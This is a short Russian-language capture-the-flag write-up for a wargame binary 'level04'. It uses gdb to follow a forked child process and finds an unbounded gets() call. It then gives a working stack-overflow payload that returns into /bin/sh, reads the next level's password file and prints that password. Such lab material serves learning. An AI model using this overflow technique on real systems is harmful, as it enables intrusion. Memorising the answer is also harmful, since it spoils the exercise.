> ls -la
> ./level04

Видим сообщение:
Give me some shellcode, k
Вводим что-то ...Видим сообщение:
child is exiting...

Дизасемблируем код и ищем момент считывания пароля.
> gdb ./level04
i var
i func

Видим, что в коде вызывается дочерний процесс.
Чтобы работать с дочерним процессом, вводим команду gdb:
> set follow fork node child
> run 

Видим, что в дочернем процессе вызывается gets.
Таким образом, мы можем переполнить и записать шелл-код в стек.
Выясняем, что старый eip дочернего элемента 
находится на расстоянии 156 байт от начала буфера.
Пишем шелл-код (чтобы вызвать bin/sh):
> (python -c 'print("a" * 156 + "\xd0\xae\xe6\xf7" + "ABCD" + "\xec\x97\xf8\xf7")' ; cat -) | ./level04

Видим сообщение:
Give me some shellcode, k
Выполняем команды:
> cd ../level05
> cat .pass

Получаем код!
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
